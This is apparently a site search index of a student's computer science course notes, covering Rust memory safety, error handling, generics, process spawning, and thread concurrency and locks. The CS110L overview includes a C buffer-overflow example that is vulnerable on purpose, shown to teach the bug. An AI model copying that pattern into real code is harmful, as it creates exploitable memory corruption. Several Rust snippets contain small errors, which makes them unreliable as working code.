[{"id":0,"href":"/notes/cs103/2020-09-16-set-theory/","title":"Set Theory","section":"CS 103, Fall 2020","content":" Set theory # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":1,"href":"/notes/cs103/2020-09-18-indirect-proofs/","title":"Indirect Proofs","section":"CS 103, Fall 2020","content":" Indirect proofs # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":2,"href":"/notes/cs103/2020-09-18-mathematical-proofs/","title":"Mathematical Proofs","section":"CS 103, Fall 2020","content":" Mathematical proofs # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":3,"href":"/notes/cs103/2020-09-26-first-order-logic/","title":"First Order Logic","section":"CS 103, Fall 2020","content":" First-order logic # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":4,"href":"/notes/cs103/2020-09-26-propositional-logic/","title":"Propositional Logic","section":"CS 103, Fall 2020","content":" Propositional logic # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":5,"href":"/notes/cs103/2020-09-27-first-order-logic-continued/","title":"First Order Logic Continued","section":"CS 103, Fall 2020","content":" First-order logic, continued # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":6,"href":"/notes/cs103/2020-09-30-binary-relations/","title":"Binary Relations","section":"CS 103, Fall 2020","content":" Binary relations # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":7,"href":"/notes/cs103/2020-10-01-binary-relations-continued/","title":"Binary Relations Continued","section":"CS 103, Fall 2020","content":" Binary relations, continued # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":8,"href":"/notes/cs103/2020-10-04-functions/","title":"Functions","section":"CS 103, Fall 2020","content":" Functions # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":9,"href":"/notes/cs103/2020-10-10-cardinality/","title":"Cardinality","section":"CS 103, Fall 2020","content":" Cardinality # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":10,"href":"/notes/cs103/2020-10-11-graph-theory/","title":"Graph Theory","section":"CS 103, Fall 2020","content":" Graph theory # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":11,"href":"/notes/cs103/2020-10-17-pigeonhole-principle/","title":"Pigeonhole Principle","section":"CS 103, Fall 2020","content":" Pigeonhole principle # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":12,"href":"/notes/cs103/2020-10-18-induction/","title":"Induction","section":"CS 103, Fall 2020","content":" Mathematical induction # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":13,"href":"/notes/cs103/2020-10-19-induction-variants/","title":"Induction Variants","section":"CS 103, Fall 2020","content":" Induction variants # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":14,"href":"/notes/cs103/2020-10-20-computability-and-formal-languages/","title":"Computability and Formal Languages","section":"CS 103, Fall 2020","content":" Computability and formal languages # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":15,"href":"/notes/cs103/2020-10-25-nondeterministic-finite-automata/","title":"Nondeterministic Finite Automata","section":"CS 103, Fall 2020","content":" Nondeterministic finite automata # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":16,"href":"/notes/cs103/2020-10-26-nfa-dfa-equivalence/","title":"Nfa Dfa Equivalence","section":"CS 103, Fall 2020","content":" NFA-DFA equivalence # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":17,"href":"/notes/cs103/2020-10-26-regular-expressions/","title":"Regular Expressions","section":"CS 103, Fall 2020","content":" Regular expressions # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":18,"href":"/notes/cs103/2020-11-01-nonregular-languages/","title":"Nonregular Languages","section":"CS 103, Fall 2020","content":" Nonregular languages # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":19,"href":"/notes/cs103/2020-11-02-context-free-grammars/","title":"Context Free Grammars","section":"CS 103, Fall 2020","content":" Context-free grammars # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":20,"href":"/notes/cs103/2020-11-03-turing-machines/","title":"Turing Machines","section":"CS 103, Fall 2020","content":" Turing machines # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":21,"href":"/notes/cs103/2020-11-08-turing-machine-subroutines/","title":"Turing Machine Subroutines","section":"CS 103, Fall 2020","content":" Turing machine subroutines # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":22,"href":"/notes/cs103/2020-11-08-universal-turing-machine/","title":"Universal Turing Machine","section":"CS 103, Fall 2020","content":" Universal Turing machine # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":23,"href":"/notes/cs103/2020-11-08-unsolvable-problems/","title":"Unsolvable Problems","section":"CS 103, Fall 2020","content":" Unsolvable problems # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":24,"href":"/notes/cs103/2020-11-14-unsolvable-problems-continued/","title":"Unsolvable Problems Continued","section":"CS 103, Fall 2020","content":" Unsolvable problems, continued # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":25,"href":"/notes/cs107/2020-09-18-integer-representations/","title":"Integer Representations","section":"CS 107, Fall 2020","content":" Integer representations # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":26,"href":"/notes/cs107/2020-09-21-bitwise-operations/","title":"Bitwise Operations","section":"CS 107, Fall 2020","content":" Bitwise operations # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":27,"href":"/notes/cs107/2020-09-25-c-chars-and-strings/","title":"C Chars and Strings","section":"CS 107, Fall 2020","content":" C chars and strings # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":28,"href":"/notes/cs107/2020-09-28-more-c-strings/","title":"More C Strings","section":"CS 107, Fall 2020","content":" More c strings # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":29,"href":"/notes/cs107/2020-10-02-pointers-arrays/","title":"Pointers Arrays","section":"CS 107, Fall 2020","content":" Pointers arrays # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":30,"href":"/notes/cs107/2020-10-05-stack-and-heap/","title":"Stack and Heap","section":"CS 107, Fall 2020","content":" Stack and heap # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":31,"href":"/notes/cs107/2020-10-09-c-generics/","title":"C Generics","section":"CS 107, Fall 2020","content":" C generics # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":32,"href":"/notes/cs107/2020-10-12-function-pointers/","title":"Function Pointers","section":"CS 107, Fall 2020","content":" Function pointers # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":33,"href":"/notes/cs107/2020-10-16-assembly/","title":"Assembly","section":"CS 107, Fall 2020","content":" Assembly # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":34,"href":"/notes/cs107/2020-10-19-assembly-arithmetic-logic/","title":"Assembly Arithmetic Logic","section":"CS 107, Fall 2020","content":" Assembly arithmetic logic # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":35,"href":"/notes/cs107/2020-10-23-assembly-control-flow/","title":"Assembly Control Flow","section":"CS 107, Fall 2020","content":" Assembly control flow # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":36,"href":"/notes/cs107/2020-10-26-assembly-function-calls-and-return-stack/","title":"Assembly Function Calls and Return Stack","section":"CS 107, Fall 2020","content":" Assembly function calls and return stack # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":37,"href":"/notes/cs107/2020-10-30-heap-management/","title":"Heap Management","section":"CS 107, Fall 2020","content":" Heap management # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":38,"href":"/notes/cs107/2020-11-09-program-optimization/","title":"Program Optimization","section":"CS 107, Fall 2020","content":" Program optimization # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":39,"href":"/notes/cs110l/2021-03-30-course-overview/","title":"Course Overview","section":"CS 110L, Spring 2021","content":" Course info # Course site: cs110l.stanford.edu\nTopics # How to prevent common mistakes in systems programming?\nMemory safety and common errors in C/C++ Preventing common memory safety errors in Rust Avoiding multiprocessing pitfalls Avoiding multithreading pitfalls Networked systems Grading # Course is pass/fail and the pass threshold is 70%\nComponents:\nLecture (2x 50min/week) Weekly exercises (40%) Small programming problems to reinforce week\u0026rsquo;s lecture material Alternatively: blog posts about course material Expected time: 1-3 hours per week Projects (40%) Mini GDB High-performance web server Participation (20%) Why Rust? # Languages like C/C++ are commonly used for systems code Issues like buffer overflow and use-after-free can create massive security holes leading to issues like remote code execution Many overflows are obvious, but some are extremely subtle and hard to spot, as below: C buffer overflow example # char buffer[128]; int bytesToCopy = packet.length; if (bytesToCopy \u0026lt; 128) { strncpy(buffer, packet.data, bytesToCopy); } Where\u0026rsquo;s the overflow?\nOverflow occurs because bytesToCopy is signed and passing it as an argument to strncpy causes it to be cast to unsigned. If a query has a packet.length of -1, then the cast will cause bytesToCopy to appear to be a very large number. A payload of larger than 128 bytes could pass the bounds check and cause a buffer overflow.\nHow to prevent making such mistakes? # Checking of data types and values at each runtime; a la Python/other interpreted languages. Disadvantage: these languages are significantly slower than compiled language and can be prohibitive for running with large inputs Dynamic analysis: Run program, watch what it does, look for problematic behavior Disadvantage: can find problematic behavior only when test inputs produce problematic behavior. Sometimes, humans need to craft inputs designed specifically to expose such behavior Commonly combined with techniques such as fuzzing to test lots of inputs, but no guarantees that code is bug-free. Static analysis: Read the source code and find problematic parts Easy with simple cases (for example, if a program uses gets(), we know it can display problematic behavior) Disadvantage: impossible in the general case (i.e., Halting Problem) Rust tries to make static analysis more tractable and helpful. It analyzes programs and attempts to disallow buffer overflow or use-after-free-prone code.\n"},{"id":40,"href":"/notes/cs110l/2021-04-01-fixing-c/","title":"Fixing C","section":"CS 110L, Spring 2021","content":" C/C++ tools for code safety # Dynamic analysis # Valgrind # On-the fly instrumentation of binaries Works with all binaries compiled by all compilers, even without source code/debug symbols Drawback: Not much information in binaries; no information about stack allocation (so no detection of stack buffer overflows) LLVM sanitizers # Instrumentation of source code Provided by LLVM compiler suite (i.e., Clang) More information because source code is instrumented rather than binaries Examples:\nAddressSanitizer - finds improper memory addresses LeakSanitizer - finds memory leaks MemorySanitizer - finds uses of uninitialized memory UndefinedBehaviorSanitizer - finds usage of null pointers, integer/float overflow, etc ThreadSanitizer - finds improper uses of threads Weaknesses of dynamic analysis # Dynamic analysis can only report bad behavior that actually happened Requires inputs which would cause bad behavior to be input to catch such behavior Fuzzing # Blind fuzzing: throw many random inputs at a program Coverage-guided fuzzing: Take normal input, run it through the program, observe control flow Semi-randomly mutate the normal input Run program again and observe control flow Keep mutated inputs that changed control flow Return to step 2 with these kept inputs, infinitely Common fuzzers: AFL and libfuzzer\nStill cannot guarantee that a program is bug-free (if the fuzzer didn\u0026rsquo;t find anything in some amount of time, maybe we didn\u0026rsquo;t run it long enough)\nStatic analysis # Linting # Basic static analysis: simple techniques to find obvious mistakes Person running linter can configure rules to enforce ex. clang-tidy - can auto-fix some issues! Dataflow analysis # Walks through every branch of the abstract syntax tree looking for issues Limitations:\nFalse positives: dataflow analysis follows every branch, even if it\u0026rsquo;s impossible for some condition to be true in real life If there are a lot of false positives (low signal-to-noise ratio), it\u0026rsquo;s difficult to actually figure out which issues pointed out are real problems Many static analyzers only analyze a single file at a time, so some bugs won\u0026rsquo;t be found if they are split across files Limitations of static analysis # Hard to tell whether code is safe without broader context if we can only look at a few lines of code Impossible to generally get broader context due to halting problem How to verify small snippets of code in isolation without broader context?\nThis can be done adding a little bit of information to the code This is what Rust does! "},{"id":41,"href":"/notes/cs110l/2021-04-06-intro-to-rust/","title":"Intro to Rust","section":"CS 110L, Spring 2021","content":" Why Rust (from a memory perspective) # What makes good code?\nPre/post conditions to break code into small pieces with well-defined interfaces in between Want to reason about small pieces in isolation If pre/post conditions of each piece is held up in isolation, then simply stringing them together works without having to keep entirety of program in one\u0026rsquo;s head Code with good memory management clearly defines how memory is passed around and \u0026ldquo;who\u0026rdquo; is responsible for cleaning it up C/C++\u0026rsquo;s compiler cannot effectively verify pre/post conditions with regards to memory. Rust\u0026rsquo;s does.\nMemory ownership # Rules # Each value in Rust has a variable that is its owner There can be only one owner at a time When the owner goes out of scope, the value gets dropped These rules are enforced at compile time!\nBasic example # fn main() { let a = Bear::get(); } a is the owner of the string and can do anything with it (ex. use member functions), and is responsible for freeing the memory.\nfn main() { let a = Bear::get(); let b = a; } Now, b is the owner and has the same access privileges and responsibility; whereas a relinquishes all privileges and responsibilities.\nBorrowing # fn main() { let a = Bear::get(); my_cool_bear_function(\u0026amp;a); /* a still has ownership and still can be used */ } my_cool_bear_function borrows the bear, but eventually gives it back to a, at which point a is responsible for freeing it.\n"},{"id":42,"href":"/notes/cs110l/2021-04-08-ownership/","title":"Ownership","section":"CS 110L, Spring 2021","content":" Drop trait # drop function called at end of scope (designated by curly braces) Special function that properly frees an entire object (maybe multiple pointers to free) Similar to C++ destructor Classes that implement a drop function have a Drop trait fn main() { let a = \u0026#34;Hello, world!\u0026#34;.to_string(); let b = a; } // a, b dropped here: drop only called on b Copy trait # Some values in Rust don\u0026rsquo;t use the heap and are stored directly on the stack (integer types, booleans, etc) These are copied by default when assigning variables, so drop doesn\u0026rsquo;t need to be called Types with this property have the Copy trait If a type has the Copy trait, it cannot also have the Drop trait Variable rules # All pieces of data in Rust are by default immutable (i.e., every variable is default const) mut keyword allows a variable to be mutable (i.e., a reverse const) Example:\nlet lst = vec![1,2,3]; vec.push(4); is not allowed, but\nlet mut lst = vec![1,2,3]; vec.push(4); is allowed.\nBorrowing type # \u0026amp; creates a variable type that is a reference to the underlying type By default types created with \u0026amp; are immutable, but can be made mutable with mut Mutable references can be made only if the underlying variable is also mutable A single value can have an infinite number of immutable references, but only one mutable reference Code examples:\nlet a = Bear::get(); let b = \u0026amp;a; my_cool_bear_function(b); let mut a = Bear::get(); let b = \u0026amp;mut a; fn append_to_vector(lst : \u0026amp;mut Vec\u0026lt;u32\u0026gt;) { lst.push(3); } fn main() { let mut lst = vec![1, 2, 3]; append_to_vector(\u0026amp;mut lst); } "},{"id":43,"href":"/notes/cs110l/2021-04-13-error-handling/","title":"Error Handling","section":"CS 110L, Spring 2021","content":" Error handling # Error handling in C # If a function can encounter an error, its return type is int or void * If successful, it returns 0, otherwise, returns -1 (or valid pointer/NULL) Function that encountered error sets global variable errno to be an integer indicating what went wrong (many such codes). If -1 or NULL was returned, caller should check errno. Heavy burden on programmer to remember how each specific function works Handling specific errors using errno creates mess of if statements Error handling using exceptions (most languages including C++) # Error happens: error propagates up the stack until handled by try/catch or reaches main and crashes program Errors will not go unnoticed, unlike C: avoids undefined behavior Disadvantages: Overhead in terms of code size Failure modes become hard to reason about; any function can throw any exception at any time Error handling in Rust # Enum (enumeration) # Type that can contain one of several variants enum TrafficLightColor { Red, Yellow, Green, } let current_state : TrafficLightColor = TrafficLightColor::Green; Match expression: like a switch statement, but all possible variants must be covered.\nfn drive(light_state : TrafficLightColor) { match light_state { TrafficLightColor::Green =\u0026gt; go(); TrafficLightColor::Yellow =\u0026gt; slow_down(); TrafficLightColor::Red =\u0026gt; stop(); } match light_state { TrafficLightColor::Green =\u0026gt; go(); _ =\u0026gt; stop(); // default binding } } Rust enums can store arbitrary data:\nenum Location { Coordinates(f32, f32), Address(String), Unknown, } fn print_location (loc : Location) { match loc { Location::Coordinates(lat, long) =\u0026gt; { println!(\u0026#34;({} {})\u0026#34;, lat, long); }, Location::Address(addr) =\u0026gt; { println!(addr); }, Location::Unknown { println!(\u0026#34;Location unknown!\u0026#34;); } } } print_location(Location::Address(\u0026#34;353 Jane Stanford Way\u0026#34;.to_string())); Result # Enum that represent successful returns and errors Function ran successfully: return Ok(return_value) Function errored: return Err(error_object) Defined in Rust standard library as\nenum Result\u0026lt;T, E\u0026gt; { Ok(T), Err(E), } Usage:\nfn gen_num_sometimes() -\u0026gt; Result\u0026lt;u32, \u0026amp;\u0026#39;static str\u0026gt; { if get_random_num() \u0026gt; 10 { Ok(get_random_num()); } else { Err(\u0026#34;Spontaneous failure!\u0026#34;); } } fn main() { match gen_num_sometimes() { Ok(num) =\u0026gt; println!(\u0026#34;Got number: {}\u0026#34;, num), Err(message) =\u0026gt; println!(\u0026#34;Operation failed: {}\u0026#34;, message), } let random_number = match gen_num_sometimes() { Ok(num) =\u0026gt; num, Err(message) =\u0026gt; println!(\u0026#34;Operation failed: {}\u0026#34;, message), } } Why this is useful: Problem in C was that it was easy to miss error; now it is obvious from function signature that an error can be returned.\nHowever: error handling is still verbose!\nThe ? operator # Compact error handling: shorthand expansion of Result\nfn helper() -\u0026gt; Result\u0026lt;T, E\u0026gt; { return do_something(); } fn main() { // if helper returns Ok(value), set val = value // if helper returns Err(some_err), stop and return/propogate that error let val : T = helper()?; } fn read_file(filename : \u0026amp;str) -\u0026gt; Result\u0026lt;String, io::Error\u0026gt; { let mut s = String::new(); File::open(filename)?.read_to_string(\u0026amp;mut s)?; // return Ok(s) } Panics # Errors we don\u0026rsquo;t wish to propogate/handle Serious/unrecoverable errors Error that we don\u0026rsquo;t anticipate happening/don\u0026rsquo;t want to put effort in handling panic! macro crashes program immediately with error message:\nif serious_issue() { panic!(\u0026#34;Sad times!\u0026#34;); } Library functions may return a Result with an Err that we don\u0026rsquo;t want to handle gracefully Result::unwrap() and Result::expect() let us take the Ok value, panicking if we got an Err. Result::expect() will add a more descriptive message while panicking let mut input = String::new(); io::stdin().read_to_string(\u0026amp;mut input).expect(\u0026#34;Failed to read from stdin\u0026#34;); Option # Like Result, for handling None (NULL).\nfn feeling_lucky() -\u0026gt; Option\u0026lt;String\u0026gt; { if get_random_num() \u0026gt; 10{ Some(String::from(\u0026#34;I\u0026#39;m feeling lucky!\u0026#34;)) } else { None } } fn main() { match feeling_lucky() { Some(num) =\u0026gt; println!(\u0026#34;{}\u0026#34;, num), None =\u0026gt; println!(\u0026#34;Not feeling lucky :/\u0026#34;); } // check if None or Some if feeling_lucky().is_none() { println!(\u0026#34;Not feeling lucky :(\u0026#34;); } if feeling_lucky().is_some() { println!(\u0026#34;Feeling lucky :)\u0026#34;); } // unwrap(), expect() work let message = feeling_lucky().unwrap(); let message = feeling_lucky().expect(\u0026#34;Function failed\u0026#34;); // add a default value if None was returned let message = feeling_lucky().unwrap_or(\u0026#34;Default value if None was returned\u0026#34;); // ? operator also works with Option let expanded_message = feeling_lucky()? + \u0026#34; Are you?\u0026#34;; } "},{"id":44,"href":"/notes/cs110l/2021-04-22-traits/","title":"Traits","section":"CS 110L, Spring 2021","content":" Traits # Create functions that we want classes to duplicate (or redefine), but outside a super class Code gets injected into any existing structure (both custom types and standard ones) Trait methods do not need to be fully defined, can define stub methods/declarations Data is not inherited Advantages:\nCode reuse: Can create trait with parametrized functions implemented differently for different traits Code hiding: All parts of a trait are exposed, but we can specify exactly which functions should be injected, so no accidental spillover Example:\nstruct TeddyBear { name : String, }; struct RedTeddyBear { name : String, }; trait Roar { fn roar(\u0026amp;self) { println!(\u0026#34;{} ROAR!!!\u0026#34;, self.name); } } impl TeddyBear { fn sing(\u0026amp;self) { println!(\u0026#34;SONG!\u0026#34;); } } impl RedTeddyBear { fn sing(\u0026amp;self) { println!(\u0026#34;RED SONG!\u0026#34;); } } impl Roar for TeddyBear {} impl Roar for RedTeddyBear { fn roar(\u0026amp;self) { println!(\u0026#34;RED ROAR!\u0026#34;); } } Standard Rust traits # Copy: New copy of an instance created instead of moving ownership when using = Clone: Returns a new copy of an instance when calling .clone() Drop: Will define destructor to be used for objects reaching end of scope Display: How to format a type, used by println!() and format!() Debug: Similar to Display but not user-facing Eq: Defines equivalence-relation equality determination for objects of the same time PartialEq: Defines partial equivalence-relation equality determination Example:\n#[derive(Clone/*,...,*/)] // this can try to get the Rust compiler to automatically define an implementation for Clone struct Point { x: u32, y: u32, } impl Clone for Point { fn clone(\u0026amp;self) -\u0026gt; Point { Point {x: self.x, y: self.y} } } "},{"id":45,"href":"/notes/cs110l/2021-04-27-generics/","title":"Generics","section":"CS 110L, Spring 2021","content":" Generics # Allow us to factor out types and write less code No performance impact at runtime: compiler creates separate functions for types that are used Example:\nfn foo\u0026lt;T\u0026gt;(x : T, y : T) -\u0026gt; T { // do something } fn main() { let x, y : usize = // some vals foo(x, y); let a, b : f32 = // some vals foo(a, b); } We can put constraints on the input types:\nfn max\u0026lt;T : PartialOrd\u0026gt;(x : T, y : T) -\u0026gt; T { // do something } fn main() { let x, y : usize = // some vals println!(\u0026#34;{}\u0026#34;, max(x, y)); let a, b : f32 = // some vals println!(\u0026#34;{}\u0026#34;, max(a, b)); } Generics and data structures # We can implement structs with generics, too:\nstruct Node\u0026lt;T\u0026gt; { value: T, next: Option\u0026lt;Box\u0026lt;Node\u0026lt;T\u0026gt;\u0026gt;\u0026gt;, } struct LinkedList\u0026lt;T\u0026gt; { head: Option\u0026lt;Box\u0026lt;Node\u0026lt;T\u0026gt;\u0026gt;\u0026gt;, length: usize, } impl\u0026lt;T\u0026gt; LinkedList\u0026lt;T\u0026gt; { fn new() -\u0026gt; LinkedList\u0026lt;T\u0026gt; { LinkedList { head : None, length : 0 } } pub fn back_mut(\u0026amp;mut self) -\u0026gt; Option\u0026lt;\u0026amp;mut Box\u0026lt;Node\u0026lt;T\u0026gt;\u0026gt;\u0026gt; { // TODO } pub fn push_back(\u0026amp;mut self, val : T) { // TODO } } impl\u0026lt;T: Display\u0026gt; LinkedList\u0026lt;T\u0026gt; { pub fn print(\u0026amp;self) P let mut curr = self.front(); while let Some(node) == curr { println!(\u0026#34;{} \u0026#34;, node.value); curr = node.next.as_ref(); } } fn main() { let mut list : LinkedList\u0026lt;String\u0026gt; = LinkedList::new(); list.push_back(\u0026#34;Hello world!\u0026#34;.to_string()); } "},{"id":46,"href":"/notes/cs110l/2021-04-29-multiprocessing/","title":"Multiprocessing","section":"CS 110L, Spring 2021","content":" C: fork() # Why it\u0026rsquo;s problematic:\nAccidentally nesting forks when spawning multiple children Children can execute code they weren\u0026rsquo;t supposed to Accessing data structures during threading Zombie children if waitpid() isn\u0026rsquo;t called C: execvp() # Execute code we want to run concurrently in a separate executable, using arguments or pipes for args Simple and powerful: can make any changes to environment before executing a program, but this isn\u0026rsquo;t easy Common multiprocessing paradigm to replace fork and execvp # fork() and exec() still exist Define higher-level abstraction for common cases ex. subprocess in Python Rust: command # Building a command # Command::new(\u0026#34;ps\u0026#34;).args(\u0026amp;[\u0026#34;--pid\u0026#34;, \u0026amp;pid.to_string(), \u0026#34;-o\u0026#34;, \u0026#34;pid= ppid= command=\u0026#34;]) Spawning processes # No concurrency: get output in buffer # let output = Command::new(\u0026#34;ps\u0026#34;) .args(\u0026amp;[\u0026#34;--pid\u0026#34;, \u0026amp;pid.to_string(), \u0026#34;-o\u0026#34;, \u0026#34;pid= ppid= command=\u0026#34;]) .output() .expect(\u0026#34;Failed to execute subprocess); No concurrency: get status code, don\u0026rsquo;t swallow output # let status = Command::new(\u0026#34;ps\u0026#34;) .args(\u0026amp;[\u0026#34;--pid\u0026#34;, \u0026amp;pid.to_string(), \u0026#34;-o\u0026#34;, \u0026#34;pid= ppid= command=\u0026#34;]) .status() .expect(\u0026#34;Failed to execute subprocess); With concurrency: spawn and immediately return # let child = Command::new(\u0026#34;ps\u0026#34;) .args(\u0026amp;[\u0026#34;--pid\u0026#34;, \u0026amp;pid.to_string(), \u0026#34;-o\u0026#34;, \u0026#34;pid= ppid= command=\u0026#34;]) .spawn() .expect(\u0026#34;Failed to execute subprocess); let status = child.wait(); Pre-exec function: # use std::os::unix::process::CommandExt; fn main() { let cmd = Command::new(\u0026#34;ls\u0026#34;); unsafe { cmd.pre_exec(some_fn); } let child = cmd.spawn(); } unsafe block disables compiler checking with regards to memory allocation or shared structure accesses with multithreading Pipes # Issues:\nLeaked file descriptors Calling close() on bad values Rust pipe type # Writing to an stdin pipe # let mut child = Command::new(\u0026#34;cat) .stdin(Stdio::piped()) .stdout(Stdio::piped()) .spawn()?; child.stdin.as_mut().unwrap().write_all(b\u0026#34;Hello, world!\\n\u0026#34;); let output = child.wait_with_output()?; Note: can also create arbitrary pipes with os_pipe crate\n"},{"id":47,"href":"/notes/cs111/2021-03-31-threads-and-dispatching/","title":"Threads and Dispatching","section":"CS 111, Spring 2021","content":" Threads # Definition: a thread is a sequential execution stream (i.e., executes instructions sequentially, one after another)\nVirtualization # Concept: one thing can behave like another - indistinguishably so\nWhy? Because modern computer hardware deals with threads in a complex, parallel (rather than serial) way, but we can treat threads as single units without having to worry about complex hardware interactions\nExecution state # Definition: Everything that can affect a thread, or be affected by it\nExamples:\nVariables Memory Interrupts Call stack (private) Registers (private) Cache Open files Network connection Clock Process # Definition: One or more threads and their execution state\nProcess model # Earliest OSes: single-tasking (1 process, 1 thread) By the late 1970s: multitasking (many processes, 1 thread per process) First on server/mainframe OSes, quickly spread to PC OSes 1990s: multithreading (many threads per process) Why? Uses multiprocessors well Also, as structuring tool to separate out independent tasks of a program Processors # Today: Processors have multiple cores, each running a thread; some cores can run two threads (hyperthreading)\nTpyical server: 2 chips, 12 cores, 2-way hyperthreading: 48 simultaneous threads\nDispatching # Every thread can run a process (fair scheduling) Threads don\u0026rsquo;t change each other\u0026rsquo;s state (protection) Process control block (per process) # Saved state for threads Scheduling information Memory for process Open files Accounting Thread states # Why no arrow from ready to blocked? Because the thread needs to run in order to wait on a resource, which is what blocked denotes.\nDispatchers # Let thread run Save state Load state of new thread See step 1 Context switch # What: Change core\u0026rsquo;s current thread\nHow:\nSave registers on stack Save stack pointer in process control block (PCB) Load stack pointer for new thread Pop register from stack Return What makes the dispatcher run?\nInterrupt (generated by hardware timer, disk I/O or keyboard input) Traps: Code written in the thread that forces it to run OS code System calls Errors Page fault Picking which thread to run # Simple approach:\nTake all ready threads and put them in a ready queue (linked list) When thread becomes ready, put it in the back of a queue Pick first off the thread to run In practice:\nMost scheduling systems have some notion of priority Queue structure organized according to priority Dispatcher does not make priority decisions; it only physically stops and starts the threads Scheduler is what makes decisions Process creation # Create a PCB Load process\u0026rsquo;s code and data into memory Create first thread Allocate stack memory Initialize thread state Make it look like thread had just been blocked before first instruction Add thread to ready queue Kernel calls # Similar to calling a method in a local process User program invokes method inside the OS Unix/Linux kernel calls # // code is the same in parent and child // fork() returns different value for parent or child int pid = fork(); if (pid == 0) { // denotes child process // execute something on the child process via the shell // typically, child will change something in inherited state before calling exec() execv(\u0026#34;/bin/ls\u0026#34;, argv); } else { // denotes parent process // wait for child process to finish // child PID is second value returned by fork() waitpid(pid, \u0026amp;status, options); } Windows kernel calls # BOOL CreateProcess( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, PVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); WaitForSingleObject(lpProcessInformation-\u0026gt;hProcess, INFINITE); "},{"id":48,"href":"/notes/cs111/2021-04-02-concurrency/","title":"Concurrency","section":"CS 111, Spring 2021","content":" Concurrency # Independent threads # Definition: a thread that can\u0026rsquo;t effect or be affected by any other thread (execution state isn\u0026rsquo;t shared with other threads)\nProperties:\nDeterministic: input state exactly determines results Reproducible Scheduling order irrelevant Example: arithmetic operations\nIn practice: this almost never happens; thread states are almost always shared within the OS\nCooperating threads # Definition: Cooperating threads have a shared state\nProperties:\nNondeterministic Not necessarily reproducible Example: suppose these are running on different threads\nprintf(\u0026#34;ABC\u0026#34;) printf(\u0026#34;CBA\u0026#34;) Possible outputs:\nABCCBA CBAABC ACBBCA ABCBCA ABCBAC etc... Note with ABCCBA we can\u0026rsquo;t tell which thread the first C came from, because we don\u0026rsquo;t know the interleaving pattern!\nWhy cooperation? # Share resources Disk Performance Read one block of a file while processing previous block Subdivide jobs Not all ordering matters: doesn\u0026rsquo;t matter if instructions access entirely independent variables/data\nBut order matters if, for example:\nA = B + 1 B = B * 2 are running on separate threads. This is called a race. Result depends on which thread finishes last.\nAtomic operations # Definition: Operation that occurs in its entirety without being interrupted.\nProperties:\nCan\u0026rsquo;t observe internal states Single-word (of memory) references and assignments Can\u0026rsquo;t produce atomic operations out of nonatomic operations Can use one atomic operation to create others Example: suppose printf() was an atomic operation. With the following on separate threads:\nprintf(\u0026#34;ABC\u0026#34;) printf(\u0026#34;CBA\u0026#34;) Possible outputs:\nABCCBA CBAABC Safety and liveness # Safety: things that we don\u0026rsquo;t want to happen in a system shouldn\u0026rsquo;t happen Liveness: system needs to do something Robust systems follow safety and liveness properties\n"},{"id":49,"href":"/notes/cs111/2021-04-05-synchronization/","title":"Synchronization","section":"CS 111, Spring 2021","content":" Synchronization # Definition: Using atomic operations to ensure correct operation of cooperating threads (includes both safety and liveness properties)\nCritical section: Piece of code where only one thread can execute at once\nMutual Exclusion (mutex): Mechanisms for implementing critical sections\nComputerized milk purchase # if (milk == 0) { if (note == 0) { note = 1 buy_milk(); note = 0; } } This doesn\u0026rsquo;t work, because thread 1 can see a zero value for note while thread 0 is setting note to 1.\nSecond attempt:\nThread A\nnoteA = 1; if (noteB == 0) { if (milk == 0) { buy_milk(); } } noteA = 0; Thread B\nnoteB = 1; if (noteA == 1) { if (milk == 0) { buy_milk(); } } noteB = 0; Problems:\nAsymmetric code Busy waiting Difficult to extend to more than two threads Mechanisms for synchronization # Mutual exclusion (locks and semaphores) Blocking (condition variables) Locks # Definition: An object that can only be owned by one thread at a time\nLock operation:\nWait until unlocked Lock it (setting locked bit) Unlock operation:\nMark lock as free If threads are waiting on the lock, wake up one of those threads In this class: std::mutex\nMilk with locks # std::mutex m; m.lock(); if (milk == 0) { buy_milk(); } m.unlock(); 